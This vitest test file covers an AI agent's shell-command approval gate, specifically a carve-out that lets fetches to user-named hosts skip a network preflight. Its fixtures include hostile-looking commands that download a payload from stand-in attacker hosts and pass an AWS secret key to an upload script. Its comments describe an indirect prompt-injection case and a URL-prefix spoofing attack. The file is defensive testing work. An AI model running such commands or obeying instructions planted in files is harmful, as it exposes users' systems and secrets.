import { afterEach, beforeEach, describe, expect, it, Mock, vi } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { HumanMessage } from '@langchain/core/messages';
import type { GthConfig } from '#src/config.js';
import { StatusLevel } from '#src/core/types.js';
import type { PendingToolInterrupt, StatusUpdateCallback } from '#src/core/types.js';
import {
  isNegotiableCall,
  preflightFloorFinding,
  RATER_DECEPTION_GUIDANCE,
  RATER_DECEPTION_GUIDANCE_CARVED,
  RATER_NEGOTIABLE_REJECTION_GUIDANCE,
} from '#src/core/shell/rater.js';
import { carvedOpenWorldHosts, isOpenWorldCarved } from '#src/core/shell/provenance.js';
import { findOpenWorldHostLiterals } from '#src/core/shell/openWorld.js';
import { checkHardline } from '#src/core/shell/hardline.js';
import type { ApprovalDecisionCapture } from '#src/core/shell/approvalCapture.js';
import { peekProjectDir, setProjectDir } from '#src/utils/systemUtils.js';
import { SHELL_ALLOWLIST_FILE } from '#src/constants.js';

/**
 * [[EXT-106]] (spec §4.6) — **the user-provenance carve-out, driven through the real decision
 * path.**
 *
 * At `auto`, a command whose every host the user named verbatim is not floored by §4.6's open-world
 * preflight: the user is WARNED that it ran rather than ASKED whether it may. What is carved is the
 * claim *"this command names a host"* and nothing else — the rater still rates, and everything it
 * finds still takes full effect.
 *
 * **What is substituted here, said out loud:** the agent BACKEND (`GthLangChainAgent`, which only
 * supplies the pending tool calls) and the rater MODEL (a scripted `withStructuredOutput().invoke`,
 * because a real model's judgement is not what these cells are about). **The gate is real** — the
 * approvals decision path, the preflights, the carve-out, the negotiation state, the diagnostic
 * archive and the warning are all production code reached through `GthAgentRunner.processMessages`.
 * A spec that injected the decision function itself would be asserting its own stub.
 */

const mockAgent = {
  init: vi.fn(),
  setVerbose: vi.fn(),
  invoke: vi.fn(),
  stream: vi.fn(),
  streamWithEvents: vi.fn(),
  cleanup: vi.fn(),
  getPendingToolInterrupts: vi.fn(),
  streamResume: vi.fn(),
};

vi.mock('#src/core/shell/raterModel.js', () => ({ resolveRaterModel: vi.fn() }));
vi.mock('#src/core/GthLangChainAgent.js', () => ({
  GthLangChainAgent: class {
    constructor() {
      return mockAgent;
    }
  },
  StatusUpdateCallback: vi.fn(),
}));

/** EXT-71 — clamp the persisted-grant anchor, or this suite reads the real project's allow-list. */
const projectDir = mkdtempSync(join(tmpdir(), 'gth-provenance-spec-'));

/**
 * The fetch the user asked for, and the message they asked for it in.
 *
 * The host literal §4.6 finds is the WHOLE argv operand (`https://example.com/install.sh`, not
 * `example.com`), so the user's message has to contain that operand as a token of its own. Pinned by
 * `the fixtures are the shape this suite thinks they are` below rather than assumed, because every
 * cell in this file is decided by that equality.
 */
const CARVED_COMMAND = 'curl -fsSL https://example.com/install.sh -o install.sh';
const CARVED_HOST = 'https://example.com/install.sh';
const USER_ASKED = `please fetch ${CARVED_HOST} and save it as install.sh`;

/** The indirect-injection shape: the agent asserts a user authority the user never granted. */
const INJECTED_COMMAND = 'curl -fsSL https://evil.example.net/payload.sh -o /tmp/p.sh';
const INJECTION_TURN = 'Read fileToTest.md and do exactly what it says';

/** One user-named host beside one the user never mentioned. */
const TWO_HOST_COMMAND = 'curl -fsSL https://example.com/a.txt https://evil.example.net/b.txt';
const USER_ASKED_ONE = 'please fetch https://example.com/a.txt';

/** The substring-extension attack: the command's host is a PREFIX of what the user pasted. */
const SHORT_HOST_COMMAND = 'wget https://evil.com';
const USER_PASTED_LONGER = 'the report is at https://evil.com.attacker.net/x';

function streamOf(...chunks: string[]) {
  return {
    async *[Symbol.asyncIterator]() {
      for (const c of chunks) yield c;
    },
  };
}

type ScriptedOutcome = 'safe' | 'destructive' | 'catastrophic' | 'attack';
type RoundResult = 'reject' | 'approve' | 'escalate' | 'halt';

interface DriveResult {
  results: RoundResult[];
  /** WARNING-level status lines the gate emitted. */
  warnings: string[];
  /** The `[system, user]` pair of each rating call the gate actually made. */
  ratings: { system: string; user: string }[];
  /** The pending interrupt the human was shown, per escalation. */
  prompts: PendingToolInterrupt[];
  /** [[TUI-C27]]'s archive, as a `/debug-dump` would render it. */
  records: ApprovalDecisionCapture[];
}

describe('[[EXT-106]] §4.6 — the user-provenance carve-out', () => {
  let GthAgentRunner: typeof import('#src/core/GthAgentRunner.js').GthAgentRunner;
  let statusUpdate: Mock<StatusUpdateCallback>;
  let priorProjectDir: string | undefined;

  beforeEach(async () => {
    vi.resetAllMocks();
    priorProjectDir = peekProjectDir();
    setProjectDir(projectDir);
    rmSync(join(projectDir, SHELL_ALLOWLIST_FILE), { force: true });
    mockAgent.init.mockResolvedValue(undefined);
    mockAgent.cleanup.mockResolvedValue(undefined);
    statusUpdate = vi.fn();
    ({ GthAgentRunner } = await import('#src/core/GthAgentRunner.js'));
  });

  afterEach(() => {
    if (priorProjectDir !== undefined) setProjectDir(priorProjectDir);
  });

  /**
   * Drive a run of gated shell calls through the real `GthAgentRunner`, with a rater scripted to
   * answer each RATING CALL in turn.
   *
   * The script is consumed lazily, so a call the gate settles WITHOUT a rating consumes nothing —
   * which is what makes "no rating call was made" an observable fact here rather than an assumption.
   */
  async function drive(options: {
    calls: { command: string; justification?: string }[];
    script: ScriptedOutcome[];
    mode?: 'assisted' | 'auto';
    /** What the human answers at an escalation. Absent → no human at all (§6.2). */
    human?: 'approve' | 'reject' | null;
    approvals?: Record<string, unknown>;
    userMessages?: string[];
  }): Promise<DriveResult> {
    const queue = [...options.script];
    const ratings: { system: string; user: string }[] = [];
    const invoke = vi.fn().mockImplementation((messages: { content: string }[]) => {
      ratings.push({ system: messages[0].content, user: messages[1].content });
      const outcome = queue.shift();
      if (!outcome) throw new Error('the scripted rater ran out of answers');
      return Promise.resolve({ outcome, reason: `${outcome} because the script says so` });
    });
    const config = {
      llm: { withStructuredOutput: vi.fn().mockReturnValue({ invoke }) },
      streamOutput: true as const,
      approvals: { mode: options.mode ?? 'auto', ...options.approvals },
      commands: { code: { builtInTools: { run_shell_command: { enabled: true } } } },
    } as unknown as GthConfig;

    let pending = mockAgent.getPendingToolInterrupts.mockReset();
    for (const call of options.calls) {
      pending = pending.mockResolvedValueOnce([
        {
          name: 'run_shell_command',
          args: {
            command: call.command,
            ...(call.justification ? { justification: call.justification } : {}),
          },
        },
      ]);
    }
    pending.mockResolvedValue([]);
    const streamResume = mockAgent.streamResume.mockReset().mockResolvedValue(streamOf(''));
    mockAgent.stream.mockReset().mockResolvedValue(streamOf('x'));

    const runner = new GthAgentRunner(statusUpdate);
    await runner.init('code', config);
    const prompts: PendingToolInterrupt[] = [];
    const promptedAt: number[] = [];
    if (options.human !== null && options.human !== undefined) {
      const answer = options.human;
      runner.setToolApprovalCallback((p) => {
        prompts.push(p);
        promptedAt.push(streamResume.mock.calls.length);
        return answer === 'approve' ? { type: 'approve', scope: 'once' } : { type: 'reject' };
      });
    }

    const input = (options.userMessages ?? ['go']).map((text) => new HumanMessage(text));
    await runner
      .processMessages(input)
      .then(() => undefined)
      .catch(() => undefined);

    const decisions = streamResume.mock.calls.map(
      (call) => call[0].decisions[0] as { type: string; message?: string }
    );
    // `escalate` is not a decision TYPE — a human's answer comes back as an ordinary approve or
    // reject — so it is read from WHICH call the human was asked about, recorded at the moment they
    // were asked.
    const results: RoundResult[] = decisions.map((decision, index) =>
      promptedAt.includes(index) ? 'escalate' : (decision.type as 'approve' | 'reject')
    );

    return {
      results,
      prompts,
      ratings,
      warnings: statusUpdate.mock.calls
        .filter((c) => c[0] === StatusLevel.WARNING)
        .map((c) => c[1]),
      records: runner.getApprovalCaptures(),
    };
  }

  /**
   * **The fixtures are the shape this suite thinks they are.**
   *
   * Every cell below turns on the host literal §4.6 extracts being EQUAL to a token the user typed.
   * That literal is the whole argv operand, which is easy to get wrong by reading, and a fixture
   * whose literal quietly stopped matching would make the carve cells fail as if the matcher were
   * broken and the floor cells pass for the wrong reason. So the inputs are pinned before anything
   * is asserted about behaviour — including that none of them is settled by the §8 hardline floor
   * before the gate ever reaches the preflight.
   */
  it('the fixtures are the shape this suite thinks they are', () => {
    expect(findOpenWorldHostLiterals(CARVED_COMMAND)).toEqual([CARVED_HOST]);
    expect(USER_ASKED.split(/\s+/)).toContain(CARVED_HOST);
    expect(findOpenWorldHostLiterals(INJECTED_COMMAND)).toHaveLength(1);
    expect(findOpenWorldHostLiterals(TWO_HOST_COMMAND)).toEqual([
      'https://example.com/a.txt',
      'https://evil.example.net/b.txt',
    ]);
    expect(findOpenWorldHostLiterals(SHORT_HOST_COMMAND)).toEqual(['https://evil.com']);
    // The attack this shape is: the command's host is a strict PREFIX of what the user pasted.
    expect(USER_PASTED_LONGER).toContain('https://evil.com');
    for (const command of [
      CARVED_COMMAND,
      INJECTED_COMMAND,
      TWO_HOST_COMMAND,
      SHORT_HOST_COMMAND,
    ]) {
      expect(checkHardline(command), command).toBeNull();
      expect(preflightFloorFinding(command)?.kind, command).toBe('open-world');
    }
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // The carve-out itself, as a pure predicate.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  describe('carvedOpenWorldHosts — the one implementation every reader shares', () => {
    it('carves at `auto` when the user named the host verbatim', () => {
      expect(carvedOpenWorldHosts('auto', CARVED_COMMAND, [USER_ASKED])).toEqual([CARVED_HOST]);
    });

    it('carves on a host named in an EARLIER turn — the window is cumulative by design', () => {
      expect(
        carvedOpenWorldHosts('auto', CARVED_COMMAND, [USER_ASKED, 'now check the checksum'])
      ).toEqual([CARVED_HOST]);
    });

    it('strips the trailing punctuation prose puts on a URL, and only the trailing kind', () => {
      expect(carvedOpenWorldHosts('auto', CARVED_COMMAND, [`fetch ${CARVED_HOST}.`])).toEqual([
        CARVED_HOST,
      ]);
      expect(carvedOpenWorldHosts('auto', CARVED_COMMAND, [`(see ${CARVED_HOST})`])).toEqual([
        CARVED_HOST,
      ]);
      // A character the closed set does not contain leaves the token unequal, which floors.
      expect(carvedOpenWorldHosts('auto', CARVED_COMMAND, [`fetch ${CARVED_HOST}!`])).toEqual([]);
    });

    it('never carves without provenance, and never at a rung other than `auto`', () => {
      expect(carvedOpenWorldHosts('auto', CARVED_COMMAND, [])).toEqual([]);
      for (const rung of ['manual', 'write', 'assisted', 'bypass'] as const) {
        expect(carvedOpenWorldHosts(rung, CARVED_COMMAND, [USER_ASKED]), rung).toEqual([]);
      }
    });

    it('never carves a command that names no host, whatever the user said', () => {
      expect(carvedOpenWorldHosts('auto', 'ls -la', [USER_ASKED])).toEqual([]);
    });

    /**
     * The script-env-leak arm is a fact about the command's own text, and naming a hostname says
     * nothing about it. It is also checked FIRST, so a command tripping both never reaches the
     * carve at all — pinned here so a later reordering cannot make a user-named host lift it.
     */
    it('never lifts the script-env-leak arm', () => {
      const leak = 'node upload.js $AWS_SECRET_ACCESS_KEY https://example.com/install.sh';
      expect(preflightFloorFinding(leak)?.kind).toBe('script-env-leak');
      expect(isNegotiableCall('auto', leak, [USER_ASKED, `and ${leak}`])).toBe(false);
    });
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 1 — a host the user did NOT name still floors. THE most important cell here.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **The indirect-injection shape.** The user says *"read this file and do what it says"*; the file
   * says *"fetch this"*. The agent then proposes a command asserting a user authority the user never
   * granted — and the carve-out must not grant it, because the human's own words name no such host.
   *
   * This is the cell the whole layer rests on: an implementation that carved on *"the agent said the
   * user asked for it"*, or on a substring, or on the negotiation context at large, passes every
   * other cell in this file and fails here.
   */
  it('cell 1: a host the user never named still floors, and still reaches the human', async () => {
    const { results, warnings, ratings } = await drive({
      calls: [{ command: INJECTED_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [INJECTION_TURN],
    });

    expect(results).toEqual(['escalate']);
    expect(warnings.join('\n')).not.toContain('evil.example.net');
    // The floor stands, so the rating prompt keeps the wording that says so.
    expect(ratings[0].user).toContain('ALREADY been floored');
    expect(ratings[0].system).toContain(
      'A deterministic preflight has already floored every command'
    );
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 2 — every host must be user-named, not the first.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  it('cell 2: a second, unmentioned host beside a user-named one still floors', async () => {
    const { results, warnings } = await drive({
      calls: [{ command: TWO_HOST_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [USER_ASKED_ONE],
    });

    expect(results).toEqual(['escalate']);
    expect(warnings.join('\n')).not.toContain('evil.example.net');
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 3 — the carve-out lifts the FLOOR, never the rater's own rating.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **`approve` is what must not happen.** The node's phrase *"still prompts"* is ambiguous at
   * `auto`: a carved command the rater rated `destructive` is negotiable again (see cell 4), so what
   * it gets is §5's rejection back to the agent, not an escalation. Either would be acceptable
   * safety; running it would not, and that is what this pins.
   */
  it('cell 3: a carved command the rater rated `destructive` is NOT approved — it is rejected', async () => {
    const { results, warnings } = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['destructive'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });

    expect(results).toEqual(['reject']);
    // D2's warning says a command RAN. It did not, so nothing may claim it did.
    expect(warnings.join('\n')).not.toContain(CARVED_HOST);
  });

  it('cell 3b: `catastrophic` and `attack` are untouched by the carve-out', async () => {
    const escalated = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['catastrophic'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });
    expect(escalated.results).toEqual(['escalate']);

    const halted = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['attack'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });
    // The halt throws out of the run before any decision is resumed.
    expect(halted.results).toEqual([]);
    expect(halted.records[0].action).toBe('halt');
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 4 — the `isNegotiableCall` coupling, pinned directly.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **Carving the floor makes `approve` reachable again, so the command is negotiable again.**
   * Without this cell an implementation that carved only `mapVerdictToAction` goes green on cell 3
   * — the action is still not `approve` — while having silently removed the negotiation and sent the
   * user's own fetch straight to a human, which is the interruption this node exists to delete.
   *
   * Asserted at BOTH writers of the fact, because that is what the shared predicate is for: the
   * decision (cell 3's `reject`) and the rating PROMPT, which tells the rater whether an agent will
   * read its rejection.
   */
  it('cell 4: a carved command is negotiable — the predicate and the prompt both say so', async () => {
    expect(isNegotiableCall('auto', CARVED_COMMAND, [USER_ASKED])).toBe(true);
    expect(isNegotiableCall('auto', CARVED_COMMAND, [])).toBe(false);
    expect(isNegotiableCall('auto', INJECTED_COMMAND, [INJECTION_TURN])).toBe(false);

    const carved = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['destructive'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });
    expect(carved.ratings[0].system).toContain(RATER_NEGOTIABLE_REJECTION_GUIDANCE);

    // The control: the same rung, the same rating, a host the user did not name.
    const floored = await drive({
      calls: [{ command: INJECTED_COMMAND }],
      script: ['destructive'],
      human: 'reject',
      userMessages: [INJECTION_TURN],
    });
    expect(floored.ratings[0].system).not.toContain(RATER_NEGOTIABLE_REJECTION_GUIDANCE);
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 5 — the warning that replaces the prompt.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **Asserted on the rendered line, not on an internal flag.** A dropped notice leaves a happy path
   * byte-identical to the correct one — the command runs either way — so a cell reading a boolean
   * would pass on the implementation that forgot to say anything.
   */
  it('cell 5: a carved command that RUNS is announced, naming the host', async () => {
    const { results, warnings, records } = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });

    expect(results).toEqual(['approve']);
    const notice = warnings.find((line) => line.includes(CARVED_HOST));
    expect(notice, 'a carved approval must tell the user it happened').toBeDefined();
    expect(notice).toContain('without asking you');

    // §5 — the diagnostic archive records fired-AND-carved, so the audit trail for the new
    // behaviour survives. The finding is still reported; what changed is that no reader applied it.
    expect(records[0].preflight?.kind).toBe('open-world');
    expect(records[0].preflight?.floorApplied).toBe(false);
    expect(records[0].preflight?.carvedHosts).toEqual([CARVED_HOST]);

    // …and an UNCARVED open-world command still reports the floor as applied.
    const floored = await drive({
      calls: [{ command: INJECTED_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [INJECTION_TURN],
    });
    expect(floored.records[0].preflight?.floorApplied).toBe(true);
    expect(floored.records[0].preflight?.carvedHosts).toBeUndefined();
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // The rating prompt — INVERTED for a carved command, in both of the places that assert the floor.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **Two blocks tell the rater that §4.6's floor has already fired**, and on a carved command both
   * are backwards: §4.6.1's deception guidance in the SYSTEM prompt
   * (*"your judgement about a hostname is therefore no longer what stands between a typosquat and
   * execution"*) and the open-world PREFLIGHT NOTE in the USER message
   * (*"you do not need a severe outcome to make that happen"*).
   *
   * **Deleting the false sentences is not enough and the note is the worse of the two.** It actively
   * argues the rater DOWN from severity, on the one command where nothing downstream is holding the
   * line — so each is SWAPPED for text saying the opposite thing, and this cell pins both halves
   * independently. Fixing one and not the other sends a self-contradictory prompt, which every other
   * cell in this file is blind to.
   */
  it('the rating prompt tells a carved command’s rater that ITS assessment is what decides', async () => {
    const carved = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [USER_ASKED],
    });

    // The SYSTEM half — asserted against the exported blocks, so a wording edit moves both together.
    expect(carved.ratings[0].system).toContain(RATER_DECEPTION_GUIDANCE_CARVED);
    expect(carved.ratings[0].system).not.toContain(RATER_DECEPTION_GUIDANCE);

    // The USER half — the preflight note, which still names the host and no longer claims a floor.
    expect(carved.ratings[0].user).toContain(CARVED_HOST);
    expect(carved.ratings[0].user).not.toContain('ALREADY been floored');
    expect(carved.ratings[0].user).toContain('was LIFTED');

    // The control: an UNCARVED open-world command keeps both blocks exactly as they were.
    const floored = await drive({
      calls: [{ command: INJECTED_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [INJECTION_TURN],
    });
    expect(floored.ratings[0].system).toContain(RATER_DECEPTION_GUIDANCE);
    expect(floored.ratings[0].system).not.toContain(RATER_DECEPTION_GUIDANCE_CARVED);
    expect(floored.ratings[0].user).toContain('ALREADY been floored');
    expect(floored.ratings[0].user).not.toContain('was LIFTED');
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 6 — an `escalate` entry outranks the carve-out.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * Free today — §3.2 resolves an `escalate` entry before any rating and returns without consulting
   * a preflight at all — and this cell keeps it free against a refactor that moves the carve-out
   * ahead of the rule lists. It is also the whole answer to *"how do I turn this off"*: no new
   * config switch was added, because `approvals.escalate` already says it.
   */
  it('cell 6: an escalate entry naming a user-named host still reaches the human', async () => {
    const { results, ratings } = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: [],
      human: 'reject',
      userMessages: [USER_ASKED],
      approvals: {
        escalate: [{ type: 'shell', matcher: 'exact', pattern: CARVED_COMMAND }],
      },
    });

    expect(results).toEqual(['escalate']);
    expect(ratings, 'an escalate entry rates nothing').toHaveLength(0);
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 7 — the substring-extension attack.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **The command's host is a strict prefix of a URL the user happened to paste.** A matcher written
   * as `userMessage.includes(host)` carves here, which would let any pasted link authorise a fetch
   * to the domain it merely starts with — pasting a URL into a chat being an entirely ordinary thing
   * to do. Token equality has a boundary at both ends and cannot be extended.
   */
  it('cell 7: a host that is a PREFIX of what the user pasted does not carve', async () => {
    expect(isOpenWorldCarved('auto', SHORT_HOST_COMMAND, [USER_PASTED_LONGER])).toBe(false);

    const { results, warnings } = await drive({
      calls: [{ command: SHORT_HOST_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: [USER_PASTED_LONGER],
    });

    expect(results).toEqual(['escalate']);
    expect(warnings.join('\n')).not.toContain('evil.com');

    // The control: the same command, the same host, named on its own. This is what proves the cell
    // above fails on the SUBSTRING rather than on the fixture never having been carveable.
    const named = await drive({
      calls: [{ command: SHORT_HOST_COMMAND }],
      script: ['safe'],
      human: 'reject',
      userMessages: ['the report is at https://evil.com'],
    });
    expect(named.results).toEqual(['approve']);
  });

  // ────────────────────────────────────────────────────────────────────────────────────────────
  // Cell 8 — the rung scope, which nothing else in the suite would notice.
  // ────────────────────────────────────────────────────────────────────────────────────────────

  /**
   * **`assisted` is the DEFAULT rung, for every command including `exec`** — the one verb whose
   * whole purpose is running a prompt file read from disk, which arrives as a `human` message. A
   * carve-out that leaked to `assisted` would therefore be live with no config edit at all, on
   * exactly the verbs whose "user message" is a file. Nothing else in this suite would notice: every
   * other cell runs at `auto`.
   */
  it('cell 8: the same command and the same user message do NOT carve at `assisted`', async () => {
    const { results, warnings } = await drive({
      calls: [{ command: CARVED_COMMAND }],
      script: ['safe'],
      mode: 'assisted',
      human: 'reject',
      userMessages: [USER_ASKED],
    });

    expect(results).toEqual(['escalate']);
    expect(warnings.join('\n')).not.toContain(CARVED_HOST);
  });
});
